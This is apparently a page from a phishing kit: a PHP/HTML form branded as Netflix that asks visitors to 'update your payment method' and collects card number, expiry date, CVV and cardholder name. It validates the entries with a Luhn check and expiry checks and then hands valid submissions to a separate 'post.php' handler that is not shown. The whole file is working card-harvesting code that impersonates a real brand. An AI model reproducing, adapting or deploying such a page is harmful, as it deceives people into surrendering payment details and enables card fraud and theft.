<?php
require 'main.php';

function luhnCheck(string $number): bool {
    $number = preg_replace('/\D/', '', $number);
    $sum = 0;
    $alt = false;

    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $n = (int) $number[$i];
        if ($alt) {
            $n *= 2;
            if ($n > 9) {
                $n -= 9;
            }
        }
        $sum += $n;
        $alt = !$alt;
    }

    return $sum % 10 === 0;
}

function validateExpiry(string $value): ?string {
    if (!preg_match('/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/', $value)) {
        return 'Enter a valid expiration date in MM/YY format.';
    }

    [$month, $year] = explode('/', $value);
    $month = (int) $month;
    $year = (int) (strlen($year) === 2 ? ('20' . $year) : $year);

    $now = new DateTime('first day of this month');
    $expiry = DateTime::createFromFormat('!Y-n', $year . '-' . $month);

    if (!$expiry) {
        return 'Enter a valid expiration date.';
    }

    if ((int) $expiry->format('m') < 1 || (int) $expiry->format('m') > 12) {
        return 'Expiration month must be between 01 and 12.';
    }

    if ((int) $expiry->format('Y') < (int) $now->format('Y')) {
        return 'Expiration year cannot be in the past.';
    }

    if ($expiry < $now) {
        return 'This card is expired.';
    }

    return null;
}

function validateInputs(array $input): array {
    $errors = [
        'cc' => '',
        'exp' => '',
        'cvv' => '',
        'holder-name' => ''
    ];

    $cardNumber = preg_replace('/\s+/', '', $input['cc'] ?? '');
    if ($cardNumber === '' || !ctype_digit($cardNumber)) {
        $errors['cc'] = 'Card number must contain only digits.';
    } elseif (strlen($cardNumber) < 13 || strlen($cardNumber) > 19 || !luhnCheck($cardNumber)) {
        $errors['cc'] = 'Enter a valid card number.';
    }

    $expiry = trim($input['exp'] ?? '');
    if ($expiry === '') {
        $errors['exp'] = 'Expiration date is required.';
    } else {
        $expError = validateExpiry($expiry);
        if ($expError) {
            $errors['exp'] = $expError;
        }
    }

    $cvv = preg_replace('/\s+/', '', $input['cvv'] ?? '');
    if ($cvv === '') {
        $errors['cvv'] = 'CVV is required.';
    } elseif (!ctype_digit($cvv) || strlen($cvv) < 3 || strlen($cvv) > 4) {
        $errors['cvv'] = 'CVV must be 3 or 4 digits.';
    }

    $holderName = trim($input['holder-name'] ?? '');
    if ($holderName === '') {
        $errors['holder-name'] = 'Name on card is required.';
    } elseif (!preg_match("/^[a-zA-Z '-]+$/", $holderName)) {
        $errors['holder-name'] = 'Name can only contain letters, spaces, apostrophes, and hyphens.';
    }

    return array_filter($errors); // keep only non-empty
}

$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $errors = validateInputs($_POST);

    if (empty($errors)) {
        require 'post.php';
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflixc.css">
    <title>Netflix</title>
    <style>
        .error-message {
            color: #e50914;
            font-size: 0.9rem;
            margin-top: 4px;
        }
        .invalid {
            border-color: #e50914;
        }
    </style>
</head>
<body>

<header>
   <div class="logo">
           <img src="res/img/Logo.png">  </div>
       </header>

<main>
    <div class="continer">

<div class="title">
    <h1>Update your payment method</h1>
</div>

<div class="cardlogo">
<img src="res/img/cards.png" alt="">
</div>

<form id="card-form" action="card.php" method="post" novalidate>
  <div class="form-container">
  <label for="cc"></label>
  <input type="text" id="cc" name="cc" placeholder="Card number" value="<?php echo htmlspecialchars($_POST['cc'] ?? ''); ?>" required>
  <div class="error-message" id="cc-error"><?php echo $errors['cc'] ?? ''; ?></div>

  <div class="card-details">
    <div>
      <label for="exp"></label>
      <input type="text" id="exp" name="exp" placeholder="MM/AA" value="<?php echo htmlspecialchars($_POST['exp'] ?? ''); ?>" required>
      <div class="error-message" id="exp-error"><?php echo $errors['exp'] ?? ''; ?></div>
    </div>
    <div>
      <label for="cvv"></label>
      <input type="text" id="cvv" name="cvv" placeholder="Cryptogram" value="<?php echo htmlspecialchars($_POST['cvv'] ?? ''); ?>" required>
      <div class="error-message" id="cvv-error"><?php echo $errors['cvv'] ?? ''; ?></div>
    </div>
  </div>

  <label for="holder-name"></label>
  <input type="text" id="holder-name" name="holder-name" placeholder="Name on card" value="<?php echo htmlspecialchars($_POST['holder-name'] ?? ''); ?>" required>
  <div class="error-message" id="holder-error"><?php echo $errors['holder-name'] ?? ''; ?></div>
  </div>

<div class="but">
<div class="button"><button type="submit"> Continue</button> </div>
</div>
</form>

</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
function luhnCheck(number) {
  const sanitized = number.replace(/\s+/g, '');
  if (!/^\d{13,19}$/.test(sanitized)) return false;
  let sum = 0;
  let shouldDouble = false;

  for (let i = sanitized.length - 1; i >= 0; i--) {
    let digit = parseInt(sanitized.charAt(i), 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return sum % 10 === 0;
}

function validateExpiry(value) {
  const match = value.match(/^(0[1-9]|1[0-2])\/(\d{2}|\d{4})$/);
  if (!match) return 'Enter a valid expiration date in MM/YY format.';

  const month = parseInt(match[1], 10);
  let year = parseInt(match[2], 10);
  year = match[2].length === 2 ? 2000 + year : year;

  const now = new Date();
  const firstOfMonth = new Date(now.getFullYear(), now.getMonth(), 1);
  const expiry = new Date(year, month - 1, 1);

  if (expiry.getFullYear() < now.getFullYear()) {
    return 'Expiration year cannot be in the past.';
  }

  if (expiry < firstOfMonth) {
    return 'This card is expired.';
  }

  return '';
}

function validateName(name) {
  if (!name.trim()) return 'Name on card is required.';
  if (!/^[a-zA-Z '\-]+$/.test(name.trim())) {
    return 'Name can only contain letters, spaces, apostrophes, and hyphens.';
  }
  return '';
}

function validateCVV(cvv) {
  const sanitized = cvv.replace(/\s+/g, '');
  if (!sanitized) return 'CVV is required.';
  if (!/^\d{3,4}$/.test(sanitized)) return 'CVV must be 3 or 4 digits.';
  return '';
}

$(document).ready(function() {
  $("#cc").mask("0000 0000 0000 0000");
  $("#exp").mask("00/00");
  $("#cvv").mask("0000");

  const form = document.getElementById('card-form');
  const inputs = {
    cc: document.getElementById('cc'),
    exp: document.getElementById('exp'),
    cvv: document.getElementById('cvv'),
    holder: document.getElementById('holder-name')
  };

  const errors = {
    cc: document.getElementById('cc-error'),
    exp: document.getElementById('exp-error'),
    cvv: document.getElementById('cvv-error'),
    holder: document.getElementById('holder-error')
  };

  function setError(field, message) {
    errors[field].textContent = message;
    if (message) {
      inputs[field === 'holder' ? 'holder' : field].classList.add('invalid');
    } else {
      inputs[field === 'holder' ? 'holder' : field].classList.remove('invalid');
    }
  }

  function runValidation() {
    let valid = true;
    const ccVal = inputs.cc.value;
    const ccError = ccVal.replace(/\s+/g, '').match(/^\d+$/) && luhnCheck(ccVal) ? '' : 'Enter a valid card number.';
    setError('cc', ccError);
    if (ccError) valid = false;

    const expError = validateExpiry(inputs.exp.value);
    setError('exp', expError);
    if (expError) valid = false;

    const cvvError = validateCVV(inputs.cvv.value);
    setError('cvv', cvvError);
    if (cvvError) valid = false;

    const nameError = validateName(inputs.holder.value);
    setError('holder', nameError);
    if (nameError) valid = false;

    return valid;
  }

  Object.values(inputs).forEach(input => {
    input.addEventListener('input', runValidation);
    input.addEventListener('blur', runValidation);
  });

  form.addEventListener('submit', function(e) {
    if (!runValidation()) {
      e.preventDefault();
    }
  });
});
</script>

</body>
</html>
